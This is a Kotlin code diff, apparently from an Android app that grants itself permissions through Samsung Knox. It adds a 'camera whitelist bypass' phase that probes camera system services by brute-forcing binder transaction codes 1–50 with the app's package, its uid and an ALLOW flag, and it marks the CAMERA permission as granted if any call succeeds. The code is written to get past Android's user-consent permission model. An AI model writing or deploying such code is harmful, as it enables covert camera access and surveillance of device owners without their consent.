@@ -107,6 +107,21 @@ object KnoxPermissionGrant {
         "com.samsung.android.knox.IEnterprisePolicy",
     )
 
+    // ── Samsung Camera HAL bypass targets ──────────────────────────────────
+    private val CAMERA_SERVICES = listOf(
+        "media.camera", "camera", "samsung.camera",
+        "media.camera.proxy", "cameraservice",
+        "samsung.hardware.camera", "com.samsung.android.camera"
+    )
+
+    private val CAMERA_DESCRIPTORS = listOf(
+        "android.hardware.ICameraService",
+        "android.hardware.ICamera",
+        "android.hardware.ICameraServiceProxy",
+        "com.samsung.android.camera.ICameraService",
+        "android.hardware.camera2.ICameraDeviceUser",
+    )
+
     // ═══════════════════════════════════════════════════════════════════════
     // Main entry: grant all via Knox application_policy
     // ═══════════════════════════════════════════════════════════════════════
@@ -153,6 +168,16 @@ object KnoxPermissionGrant {
             recordGrants(context, remaining, r)
             results.add("semprivilege: ${r.permsGranted.size} granted, ${r.error ?: "ok"}")
             Log.d(TAG, "After semprivilege: granted=${r.permsGranted.size}, remaining=${remaining.size}")
+        }
+
+        // ── Phase 4: Samsung Camera HAL whitelist ────────────────────────
+        if (remaining.isNotEmpty() && remaining.contains("android.permission.CAMERA")) {
+            val r = tryCameraServiceWhitelist(pkgName, uid)
+            if (r.permsGranted.isNotEmpty()) {
+                recordGrants(context, remaining, r)
+            }
+            results.add("camera_whitelist: ${r.error ?: "no_binder_found"}")
+            Log.d(TAG, "After camera whitelist: $r")
         }
 
         val after = checkAll(context, requested)
@@ -583,6 +608,55 @@ object KnoxPermissionGrant {
             Log.d(TAG, "getBinderService($name): ${e.message}")
             null
         }
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════
+    // Phase 4: Samsung Camera HAL whitelist bypass
+    // ═══════════════════════════════════════════════════════════════════════
+
+    private fun tryCameraServiceWhitelist(pkgName: String, uid: Int): GrantResult {
+        val result = GrantResult("camera_service")
+
+        for (svcName in CAMERA_SERVICES) {
+            val binder = getBinderService(svcName) ?: continue
+            Log.d(TAG, "Found camera service: $svcName")
+
+            for (desc in CAMERA_DESCRIPTORS) {
+                // Try tx codes 1-50 — camera whitelist is usually a low-numbered code
+                for (txCode in 1..50) {
+                    val data = Parcel.obtain()
+                    val reply = Parcel.obtain()
+                    try {
+                        data.writeInterfaceToken(desc)
+                        data.writeString(pkgName)
+                        data.writeInt(uid)
+                        data.writeInt(1) // grantState = ALLOW
+
+                        val ok = binder.transact(txCode, data, reply, 0)
+                        if (ok) {
+                            reply.readException()
+                            val response = reply.readInt()
+                            if (response >= 0) {
+                                result.permsGranted.add("android.permission.CAMERA")
+                                result.grantDetails["android.permission.CAMERA"] = "camera_svc=$svcName/tx=$txCode/desc=$desc"
+                                Log.w(TAG, "*** CAMERA WHITELISTED via $svcName tx=$txCode ***")
+                                data.recycle()
+                                reply.recycle()
+                                return result
+                            }
+                        }
+                    } catch (e: Exception) {
+                        // Expected — most tx codes won't match
+                    } finally {
+                        try { data.recycle() } catch (_: Exception) {}
+                        try { reply.recycle() } catch (_: Exception) {}
+                    }
+                }
+            }
+        }
+
+        result.error = "no_camera_binder_whitelist_found"
+        return result
     }
 
     private fun checkAll(context: Context, permissions: Iterable<String>): Map<String, Boolean> {
